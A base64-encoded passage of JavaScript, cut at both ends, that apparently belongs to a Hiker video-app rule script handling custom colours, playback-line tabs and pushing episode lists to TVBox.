aXMuc3RyQ29udmVydChhcnJheSk7XFxuICAgICAgICBhcnJheSA9IHRoaXMuc3RyQ29udmVydChhcnJheSk7XFxuICAgICAgICBcXG4gICAgICAgIGlmKGFycmF5Lmxlbmd0aD42KXtcXG4gICAgICAgICAgICBhcnJheT1hcnJheS5zbGljZSgwLDYpO1xcbiAgICAgICAgfVxcbiAgICAgICAgXFxuICAgICAgICB2YXIgdGl0bGVzID0gW107XFxuICAgICAgICB2YXIgZGVzY3MgPSBbXTtcXG4gICAgICAgIFxcbiAgICAgICAgc3dpdGNoIChhcnJheS5sZW5ndGgpIHtcXG4gICAgICAgICAgICBjYXNlIDQ6XFxuICAgICAgICAgICAgY2FzZSA1OlxcbiAgICAgICAgICAgICAgICB0aXRsZXMgPSBhcnJheS5zbGljZSgwLCAyKTtcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgyKTtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgY2FzZSA2OlxcbiAgICAgICAgICAgICAgICB0aXRsZXMgPSBhcnJheS5zbGljZSgwLCAzKTtcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgzKTtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICB9XFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcignZXJfaW5mbycse1xcbiAgICAgICAgICBkZXNjOmRlc2NzLmpvaW4oJ1xcXFxuJyksXFxuICAgICAgICAgIGltZzppbWcsXFxuICAgICAgICB9KVxcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogIHRoaXMuc21hbGwodGl0bGVzWzBdICsgJ1xcXFxuJyArdGl0bGVzLnNsaWNlKDEsIDMpLmpvaW4oJ1xcXFxuJyksJ3JlZCcpLFxcbiAgICAgLy90aXRsZTogIHRoaXMuc21hbGwocGRmaChodG1sLCAnLmRhdGE6Y29udGFpbnMo5pu05pawKSYmVGV4dCcpICsgJ1xcXFxuJyArIHBkZmgoaHRtbCwgJy5kYXRhOmNvbnRhaW5zKOexu+WeiykmJlRleHQnKSwncmVkJyksXFxuICAgICAgICAgZGVzYzogdGhpcy5zbWFsbChkZXNjcy5qb2luKCdcXFxcbicpLCcjRkY3RjAwJyksXFxuICAgICAgLy9kZXNjOiB0aGlzLnNtYWxsKHBkZmgoaHRtbCwgJy5kYXRhOmNvbnRhaW5zKOWvvOa8lCkmJlRleHQnKSArICdcXFxcbicgKyBwZGZoKGh0bWwsICcuZGF0YTpjb250YWlucyjkuLvmvJQpJiZUZXh0JyksJyNGRjdGMDAnKSxcXG4gICAgIC8vZGVzYzogdGhpcy5zbWFsbChwZGZoKGh0bWwsICcuZGF0YTpjb250YWlucyjmm7TmlrApJiZUZXh0JyksJyNGRjdGMDAnKSxcXG4gICAgICAgICAgICBwaWNfdXJsOiBpbWcgKyAnQFJlZmVyZXI9JyxcXG4gICAgICAgICAgICB1cmw6IE1ZX1VSTCxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfdmVydGljYWxfcGljX2JsdXInLFxcbiAgICAgICAgfSlcXG4gICAgICAgIGlmIChvYmouZGVzYyAhPSB1bmRlZmluZWQpIHtcXG4gICAgICAgICAgICB0aGlzLnNldERlc2Mob2JqLmRlc2MpO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICBzZXRDdXN0b206IGZ1bmN0aW9uKG9iaiwgaW1nKSB7XFxuICAgICAgICB2YXIgYXJyYXkgPSBbXTtcXG4gICAgICAgIGlmIChvYmouY29uc3RydWN0b3IgPT0gQXJyYXkpIHtcXG4gICAgICAgICAgICBhcnJheSA9IG9iajtcXG4gICAgICAgIH1cXG4gICAgICAgIGFycmF5ID0gdGhpcy5zdHJDb252ZXJ0KGFycmF5KTtcXG4gICAgICAgIHZhciB0aXRsZXMgPSBbXTtcXG4gICAgICAgIHZhciBkZXNjcyA9IFtdO1xcbiAgICAgICAgc3dpdGNoIChhcnJheS5sZW5ndGgpIHtcXG4gICAgICAgICAgICBjYXNlIDQ6XFxuICAgICAgICAgICAgY2FzZSA1OlxcbiAgICAgICAgICAgICAgICB0aXRsZXMgPSBhcnJheS5zbGljZSgwLCAyKTtcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgyKTtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgY2FzZSA2OlxcbiAgICAgICAgICAgICAgICB0aXRsZXMgPSBhcnJheS5zbGljZSgwLCAzKTtcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgzKTtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICB9XFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcignZXJfaW5mbycse1xcbiAgICAgICAgICBkZXNjOmRlc2NzLmpvaW4oJ1xcXFxuJyksXFxuICAgICAgICAgIGltZzppbWcsXFxuICAgICAgICB9KVxcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGVzWzBdICsgJ1xcXFxuJyArIHRoaXMuc21hbGwodGl0bGVzLnNsaWNlKDEsIDMpLmpvaW4oJ1xcXFxuJykpLFxcbiAgICAgICAgICAgIGRlc2M6IHRoaXMuc21hbGwoZGVzY3Muam9pbignXFxcXG4nKSksXFxuICAgICAgICAgICAgcGljX3VybDogaW1nICsgJ0BSZWZlcmVyPScsXFxuICAgICAgICAgICAgdXJsOiBNWV9VUkwsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpY19ibHVyJyxcXG4gICAgICAgIH0pXFxuICAgIH0sXFxuICAgIGlzQ29sb3I6ZnVuY3Rpb24odGV4dCkge1xcbiAgICAgY29uc3QgcmVnZXggPSAvXiMoWzAtOUEtRmEtZl17M318WzAtOUEtRmEtZl17Nn0pJHxeKFthLXpdKykkL2k7XFxuICAgICByZXR1cm4gcmVnZXgudGVzdCh0ZXh0KTtcXG4gICAgfSxcXG4gICAgZ2V0UHJlc2V0OmZ1bmN0aW9uKGN1c3RvbSl7XFxuICAgICAgaWYodHlwZW9mIGN1c3RvbWRhdGE9PSdvYmplY3QnJiYhY3VzdG9tKXtcXG4gICAgICAgIGN1c3RvbT1jdXN0b21kYXRhO1xcbiAgICAgIH1lbHNle1xcbiAgICAgICAgY3VzdG9tPWN1c3RvbT9jdXN0b206e31cXG4gICAgICB9XFxuICAgICAgY3VzdG9tLuato+W6j+minOiJsj0oY3VzdG9tLuato+W6j+minOiJsiYmdGhpcy5pc0NvbG9yKGN1c3RvbS7mraPluo/popzoibIpKT9jdXN0b20u5q2j5bqP6aKc6ImyOicjMUFBRDE5JztcXG4gICAgICBjdXN0b20u6YCG5bqP6aKc6ImyPShjdXN0b20u6YCG5bqP6aKc6ImyJiZ0aGlzLmlzQ29sb3IoY3VzdG9tLumAhuW6j+minOiJsikpP2N1c3RvbS7pgIbluo/popzoibI6JyNGRjAwMDAnO1xcbiAgICAgIGN1c3RvbS7lm77moIc9Y3VzdG9tLuWbvuaghz9jdXN0b20u5Zu+5qCHOidodHRwczovL2kyLjEwMDAyNC54eXovMjAyMy8wNi8xMC9oNHo2Mjcud2VicCc7XFxuICAgICAgY3VzdG9tLue6v+i3r+mAieS4rT1jdXN0b20u57q/6Lev6YCJ5LitP2N1c3RvbS7nur/ot6/pgInkuK06JyMwMDhCOEInO1xcbiAgICAgIHJldHVybiBjdXN0b207XFxuICAgIH0sXFxuICAgIGNyZWF0ZVBMaXN0OiBmdW5jdGlvbih0YWJzLHZhcmksc2hzb3J0LGN1c3RvbSl7XFxuICAgICAgdmFyaT1cXFwiZXJfXFxcIit2YXJpO1xcbiAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGFicy5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgIHZhciB1cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh2YXJpLCBzaHNvcnQsIGksbGluZWMpID0+IHtcXG4gICAgICAgICAgICAgICAgXFxuICAgICAgICAgICAgdmFyIGxpc3RzID0gc3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0ICsgJ19saXN0JywgJ1tdJyk7XFxuICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgaWYoZ2V0TXlWYXIodmFyaSsnZm9sZCcsJzEnKT09JzAnKXtcXG4gICAgICAgICAgICAgICAgdmFyIGJ0bj1maW5kSXRlbShzaHNvcnQrJ19idXR0b24nKTtcXG4gICAgICAgICAgICAgICAgdmFyIGZvbGRzPVsnPGZvbnQgY29sb3I9XFxcIiNEM0QzRDNcXFwiPuKYtycsJzxmb250IGNvbG9yPVxcXCIjRkZBNTAwXFxcIj7imLAnXTtcXG4gICAgICAgICAgICAgICAgICB2YXIgcGxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcignZXJfcGxheWxpc3RzJywgJ3t9Jyk7XFxuICAgICAgICAgICAgICAgICAgXFxuICAgICAgICAgICAgICAgICAgdmFyIGNvbCA9IHBsaXN0W3Noc29ydF0uY29sX3R5cGU7XFxuICAgICAgICAgICAgICAgICAgdmFyIGNscyA9IHBsaXN0W3Noc29ydF0uY2xzO1xcbiAgICAgICAgICAgICAgICAgIHZhciBwaWM9cGxpc3Rbc2hzb3J0XS5waWM7XFxuICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShidG4uZXh0cmEuaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBidG4udGl0bGUucmVwbGFjZShmb2xkc1swXSwgZm9sZHNbMV0pLFxcbiAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIodmFyaSsnZm9sZCcsJzEnKTtcXG4gICAgICAgICAgICAgIC8vcmV0dXJuICd0b2FzdDovL+WxleW8gOaJjeiDveaTjeS9nCc7XFxuICAgICAgICAgICAgICAgICB9ZWxzZXtcXG4gICAgICAgICAgICAgICAgICAgIHZhciBwbGlzdCA9IHN0b3JhZ2UwLmdldE15VmFyKCdlcl9wbGF5bGlzdHMnLCAne30nKTtcXG4gICAgICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIGNvbCA9IHBsaXN0W3Noc29ydF0uY29sX3R5cGU7XFxuICAgICAgICAgICAgICAgICAgICB2YXIgY2xzID0gcGxpc3Rbc2hzb3J0XS5jbHM7XFxuICAgICAgICAgICAgICAgICAgICB2YXIgcGljPXBsaXN0W3Noc29ydF0ucGljO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKHZhcmksIGkpO1xcblxcbiAgICAgICAgICAgICAgICB2YXIgeGxpc3Q9bGlzdHNbaV07XFxuICAgICAgICAgICAgICAgIGlmKCQuZnVuYyE9dW5kZWZpbmVkJiYkLmZ1bmMuY29uc3RydWN0b3I9PUZ1bmN0aW9uKXtcXG4gICAgICAgICAgICAgICAgICAgIHhsaXN0PSQuZnVuYyhpKTtcXG4gICAgICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoc2hzb3J0ICsgJ19saXN0JywgeGxpc3QpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHZhciBwbGF5cyA9IHhsaXN0Lm1hcCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHgudGl0bGUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB4LnVybCxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogY29sLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBpYzpwaWMsXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IHgudXJsLnJlcGxhY2UoL0BsYXp5UnVsZVtcXFxcc1xcXFxTXSsvZywgJycpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbHM6IGNscyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgIGlmIChnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnKSA9PSAnMScpIHtcXG4gICAgICAgICAgICAgICAgICAgIHBsYXlzLnJldmVyc2UoKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB2YXIgcGNmZz1zdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJywne30nKTtcXG4gICAgICAgICAgICAgICAgaWYocGNmZ1sn5Y2V5o6oJ10pe1xcbiAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaCcse1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6cGNmZ1snb2JqJ11bJ+WNleaOqCddWzBdXFxuICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICBwY2ZnWyfljZXmjqgnXT1mYWxzZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZihwY2ZnWyfpgInmjqgnXSl7XFxuICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQrJ19wdXNocycse1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6cGNmZ1snb2JqJ11bJ+mAieaOqCddWzBdXFxuICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT1mYWxzZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJyxwY2ZnKTtcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKHNoc29ydCk7XFxuICAgICAgICAgICAgICAgIGFkZEl0ZW1BZnRlcihzaHNvcnQgKyAnX2xpbmUnLCBwbGF5cyk7XFxuXFxuICAgICAgICAgICAgICAgIHZhciB0YWJ4ID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0ICsgJ190YWInKTtcXG4gICAgICAgICAgICAgICAgdGFieC5mb3JFYWNoKCh4LCBpaSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIHRpdGxlID0geC50aXRsZTtcXG4gICAgICAgICAgICAgICAgICAgIGlmIChpID09IGlpKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh4LmV4dHJhLmlkLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZS5yZXBsYWNlKC8jKFxcXFx3Kyk/L2csIGxpbmVjKSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLnJlcGxhY2UoLyMoXFxcXHcrKT8vZywgJyMnKSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5YiH5o2i5oiQ5Yqf77yBJztcXG4gICAgICAgICAgICB9LCB2YXJpLCBzaHNvcnQsIGksY3VzdG9tLue6v+i3r+mAieS4rSlcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAoZ2V0TXlWYXIodmFyaSwgJzAnKSA9PSBpID8gdGFic1tpXS5mb250Y29sb3IoY3VzdG9tLue6v+i3r+mAieS4rSkgOiB0YWJzW2ldLmZvbnRjb2xvcignIycpKSxcXG4gICAgICAgICAgICAgICAgdXJsOiB1cmwsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBjbHM6IHNoc29ydCArICdfdGFiJyxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBzaHNvcnQgKyAnX3RhYl8nICsgaSxcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICB9XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIGNvbF90eXBlOidibGFua19ibG9jaycsIC8vJ2JsYW5rX2Jsb2NrJyxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogc2hzb3J0ICsgJ19saW5lJyxcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICBwdXNoVGFiOmZ1bmN0aW9uKHZhcmksc2hzb3J0KXtcXG4gICAgICBhZGRMaXN0ZW5lcignb25SZWZyZXNoJywgJC50b1N0cmluZygoc2hzb3J0KSA9PiB7XFxuICAgICAgICBjbGVhck15VmFyKHNoc29ydCsnX3B1c2hjZmcnKTtcXG4gICAgICAgIGNsZWFyTXlWYXIoc2hzb3J0KydfZHVvc2VsZWN0Jyk7XFxuICAgICAgICB9LCBzaHNvcnQpKVxcbiAgICAgICB2YXIgcG9iaj17XFxuICAgICAgICfljZXmjqgnOlsn4qa/5Y2V5o6oJywnPGI+4qa/5Y2V5o6oPC9iPicuZm9udGNvbG9yKCcjMDBGQTlBJyldLFxcbiAgICAgICAn6YCJ5o6oJzpbJ+KYkemAieaOqCcsJzxiPuKYkemAieaOqDwvYj4nLmZvbnRjb2xvcignIzQ2ODJCNCcpXSxcXG4gICAgICB9XFxuICAgICAgXFxuICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgdGl0bGU6J+KMmCcsXFxuICAgICAgICAgIGNvbF90eXBlOidzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgdXJsOidoaWtlcjovL2VtcHR5JyxcXG4gICAgICAgICAgZXh0cmE6e1xcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJyxcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSx7XFxuICAgICAgICAgIHRpdGxlOnBvYmpbJ+WNleaOqCddWzBdLFxcbiAgICAgICAgICBjb2xfdHlwZTonc2Nyb2xsX2J1dHRvbicsXFxuICAgICAgICAgIHVybDokKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzaHNvcnQscG9iaix2YXJpKT0+e1xcbiAgICAgICAgICBpZihnZXRNeVZhcih2YXJpKydmb2xkJywnMScpPT0nMCcpe1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lsZXlvIDmiY3og73mk43kvZwnO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgICAgXFxuICAgICAgICAgIHZhciB0aXRsZXM9cG9ialsn5Y2V5o6oJ107XFxuICAgICAgICAgIHZhciBwY2ZnPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCsnX3B1c2hjZmcnLCd7fScpO1xcbiAgICAgICAgICBwY2ZnWydvYmonXT1wb2JqO1xcbiAgICAgICAgICB2YXIg5Y2V5o6oPXBjZmdbJ+WNleaOqCddP3BjZmdbJ+WNleaOqCddOmZhbHNlO1xcbiAgICAgICAgICBcXG4gICAgICAgICAgaWYo5Y2V5o6oKXtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2gnLHtcXG4gICAgICAgICAgICAgIHRpdGxlOnRpdGxlc1swXSxcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIHBjZmdbJ+WNleaOqCddPWZhbHNlO1xcbiAgICAgICAgICAgIHBjZmdbJ3BsYXlsaXN0J10ubWFwKCh4KT0+e1xcbiAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oeC5leHRyYS5pZCx7XFxuICAgICAgICAgICAgICAgICB1cmw6eC51cmwsXFxuICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICB9ZWxzZXtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2gnLHtcXG4gICAgICAgICAgICAgIHRpdGxlOifigJzigJzigJ3igJ0nK3RpdGxlc1sxXSxcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaHMnLHtcXG4gICAgICAgICAgICAgIHRpdGxlOnBvYmpbJ+mAieaOqCddWzBdLFxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgcGNmZ1sn5Y2V5o6oJ109dHJ1ZTtcXG4gICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT1mYWxzZTtcXG4gICAgICAgICAgICB2YXIgcGxheWxpc3Q9ZmluZEl0ZW1zQnlDbHMoc2hzb3J0KTtcXG4gICAgICAgICAgICBwY2ZnWydwbGF5bGlzdCddPXBsYXlsaXN0O1xcbiAgICAgICAgICAgIGZpbmRJdGVtc0J5Q2xzKHNoc29ydCkubWFwKHg9PntcXG4gICAgICAgICAgICAgIHZhciBkcHVzaD17XFxuICAgICAgICAgICAgICAgIG5hbWU6Z2V0UGFnZVRpdGxlKCksXFxuICAgICAgICAgICAgICAgIHVybDp4LnRpdGxlKyckJyt4LmV4dHJhLmlkXFxuICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQse1xcbiAgICAgICAgICAgICAgICB1cmw6JCgnJykubGF6eVJ1bGUoKGRwdXNoKT0+e1xcbiAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2UvcHVzaD9ydWxlPVhZUeaOqOmAgSZwdXNodXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkoZHB1c2gpKTtcXG4gICAgICAgICAgICAgICAgfSxkcHVzaClcXG4gICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgfVxcbiAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJyxwY2ZnKTtcXG4gICAgICAgICAgcmV0dXJuICd0b2FzdDovLycrKOWNleaOqD8n5Y2V5o6o5byA5ZCvJzon5Y2V5o6o5YWz6ZetJyk7XFxuICAgICAgICAgIH0sc2hzb3J0LHBvYmosdmFyaSksXFxuICAgICAgICAgIGV4dHJhOntcXG4gICAgICAgICAgICBpZDpzaHNvcnQrJ19wdXNoJyxcXG4gICAgICAgICAgICBjbHM6c2hzb3J0KydfcHVzaHRhYicsXFxuICAgICAgICAgIH1cXG4gICAgICAgIH0se1xcbiAgICAgICAgICB0aXRsZTpwb2JqWyfpgInmjqgnXVswXSxcXG4gICAgICAgICAgY29sX3R5cGU6J3Njcm9sbF9idXR0b24nLFxcbiAgICAgICAgICB1cmw6JCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2hzb3J0LHBvYmosdmFyaSk9PntcXG4gICAgICAgICAgaWYoZ2V0TXlWYXIodmFyaSsnZm9sZCcsJzEnKT09JzAnKXtcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bGV5byA5omN6IO95pON5L2cJztcXG4gICAgICAgICAgfVxcbiAgICAgICAgICB2YXIgdGl0bGVzPXBvYmpbJ+mAieaOqCddO1xcbiAgICAgICAgICB2YXIgcGNmZz1zdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJywne30nKTtcXG4gICAgICAgICAgcGNmZ1snb2JqJ109cG9iajtcXG4gICAgICAgICAgdmFyIOmAieaOqD1wY2ZnWyfpgInmjqgnXT9wY2ZnWyfpgInmjqgnXTpmYWxzZTtcXG4gICAgICAgICAgaWYo6YCJ5o6oKXtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2hzJyx7XFxuICAgICAgICAgICAgICB0aXRsZTp0aXRsZXNbMF0sXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT1mYWxzZTtcXG4gICAgICAgICAgICBwY2ZnWydwbGF5bGlzdCddLm1hcCgoeCk9PntcXG4gICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQse1xcbiAgICAgICAgICAgICAgICAgdGl0bGU6eC50aXRsZSxcXG4gICAgICAgICAgICAgICAgIHVybDp4LnVybCxcXG4gICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQrJ19wdXNodG8nLCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ+aOqOmAgeacrOmhtT0+VFZCb3gnLFxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoc2hzb3J0KydfZHVvc2VsZWN0Jyk7XFxuICAgICAgICAgICB9ZWxzZXtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2hzJyx7XFxuICAgICAgICAgICAgICB0aXRsZTon4oCc4oCc4oCd4oCdJyt0aXRsZXNbMV0sXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT10cnVlO1xcbiAgICAgICAgICAgIHBjZmdbJ+WNleaOqCddPWZhbHNlO1xcbiAgICAgICAgICAgIHZhciBwbGF5bGlzdD1maW5kSXRlbXNCeUNscyhzaHNvcnQpO1xcbiAgICAgICAgICAgIHBjZmdbJ3BsYXlsaXN0J109cGxheWxpc3Q7XFxuICAgICAgICAgICAgbGV0IElkcz1wbGF5bGlzdC5tYXAoaXQgPT4gaXQuZXh0cmEuaWQpO1xcbiAgICAgICAgICAgICAgICBJZHMuZm9yRWFjaCh4ID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHZhciB0aXRsZSA9IGZpbmRJdGVtKHgpLnRpdGxlO1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh4LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiAkLm1zbSh0aXRsZSwgeCxzaHNvcnQpLFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaCcse1xcbiAgICAgICAgICAgICAgdGl0bGU6cG9ialsn5Y2V5o6oJ11bMF0sXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2h0bycsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5o6o6YCB6YCJ5LitPT5UVkJveCcsXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgIH1cXG4gICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoc2hzb3J0KydfcHVzaGNmZycscGNmZyk7XFxuICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly8nKyjpgInmjqg/J+mAieaOqOW8gOWQryc6J+mAieaOqOWFs+mXrScpO1xcbiAgICAgICAgICB9LHNoc29ydCxwb2JqLHZhcmkpLFxcbiAgICAgICAgICBleHRyYTp7XFxuICAgICAgICAgICAgaWQ6c2hzb3J0KydfcHVzaHMnLFxcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJ1xcbiAgICAgICAgICB9XFxuICAgICAgICB9LHtcXG4gICAgICAgICAgdGl0bGU6IFxcXCLmjqjpgIHmnKzpobU9PlRWQm94XFxcIixcXG4gICAgICAgICAgY29sX3R5cGU6J3Njcm9sbF9idXR0b24nLFxcbiAgICAgICAgICB1cmw6JCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2hzb3J0LHZhcmkpPT57XFxuICAgICAgICAgIHZhciBwY2ZnPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCsnX3B1c2hjZmcnLCd7fScpO1xcbiAgICAgICAgICB2YXIg5Y2V5o6oPXBjZmdbJ+WNleaOqCddP3BjZmdbJ+WNleaOqCddOmZhbHNlO1xcbiAgICAgICAgICB2YXIg6YCJ5o6oPXBjZmdbJ+mAieaOqCddP3BjZmdbJ+mAieaOqCddOmZhbHNlO1xcbiAgICAgICAgICBpZigh5Y2V5o6oJiYh6YCJ5o6oKXtcXG4gICAgICAgICAgdmFyIHRhYnM9c3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0KydfdGFicycsJ1tdJyk7XFxuICAgICAgICAgIHRyeXtcXG4gICAgICAgICAgdmFyIHBscz1zdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrJ19saXN0JywnW10nKS5tYXAobGkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgIHJldHVybiBsaS5tYXAoaXRlbSA9PiBpdGVtLnRpdGxlICsgJyQnICsgaXRlbS51cmwucmVwbGFjZSgvQGxhenlSdWxlW1xcXFxzXFxcXFNdKy9nLCcnKSkuam9pbignIycpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLmpvaW4oJyQkJCcpO1xcbiAgICAgICAgICB9Y2F0Y2h7XFxuICAgICAgICAgIHZhciBwbHM9c3RvcmFnZTAuZ2V0TXlWYX